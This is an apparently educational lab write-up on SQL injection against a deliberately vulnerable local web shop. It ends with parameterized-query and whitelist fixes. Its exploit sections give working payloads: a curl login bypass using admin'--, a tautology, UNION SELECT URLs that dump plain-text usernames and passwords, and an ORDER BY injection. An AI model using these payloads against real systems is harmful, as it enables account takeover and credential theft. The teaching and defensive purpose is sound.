# Lab 03: SQL injection — login, search, sort

Three spots concatenate user input into SQL. Login uses a tautology or a comment to bypass; search leaks the database with `UNION`; orders sort injects into `ORDER BY`.

**OWASP Top 10:2025:** [A05 Injection](https://owasp.org/Top10/2025/)

**Code:** `model/db.js` (`login`, `searchProducts`, `ordersForUserSorted`), `routes/auth.js`, `routes/shop.js` — see `VULN:` / `SAFE:` comments

## Exploit 1: login bypass

Log in as any user without a password:

```bash
curl -s -D - -o /dev/null -X POST http://localhost:8888/login/auth \
  --data-urlencode "username=admin'--" --data-urlencode "password=x" | grep -i location
# Location: /   ← admin session
```

Or the classic tautology: `username=' OR '1'='1` (logs you in as the first user). Both work from the login page too — type them in the username box.

## Exploit 2: UNION on search

`/search?q=` concatenates into `SELECT * FROM products ...` — 10 columns: `id, name, description, long_description, price_cents, image, stock, category, featured, tags` (`tags` is `text[]`, so it needs a `{v}` literal).

1. Read the database version:

```text
http://localhost:8888/search?q=' UNION SELECT 1,version(),'d','l',0,'e','c',false,'{v}',6--
```

2. Dump the users table — username as product name, **password** as long description:

```text
http://localhost:8888/search?q=' UNION SELECT 1,username,password,email,0,'e',6,'c',false,'{v}' FROM users--
```

You get fake product cards: "alice" described by `alice123`, "bob" by `bob123`, "admin" by `admin123`. Full plain-text credentials, no hash cracking needed.

3. (Debug mode adds contrast: `q='` alone renders the raw SQL error — see lab 09.)

## Exploit 3: ORDER BY injection

`/orders?sort=` is interpolated (ORDER BY cannot be a bound parameter). Log in as any user, then:

```text
http://localhost:8888/orders?sort=nope
```

returns the SQL error — confirming injection. From here, error-based extraction works (`sort=CASE WHEN (SELECT 1) THEN username ELSE id END`), and `sort=1`/`sort=amount_cents` show the query is fully attacker-shaped.

## Fix

```js
// login + search: parameters
pool.query("SELECT * FROM users WHERE username=$1 AND password=$2", [u, p]);
pool.query("SELECT * FROM products WHERE name ILIKE $1 OR description ILIKE $2",
  [`%${q}%`, `%${q}%`]);

// sort: whitelist — never interpolate
const SORTS = { date: "created_at", price: "amount_cents" };
const col = SORTS[req.query.sort] ?? "created_at";
```

## Verify

All three exploits return normal responses (401 / 0 results / default sort) after the fix.

Related: lab 09 shows the SQL error text rendered on the page; lab 01 shows what leaking those `orders` rows is worth.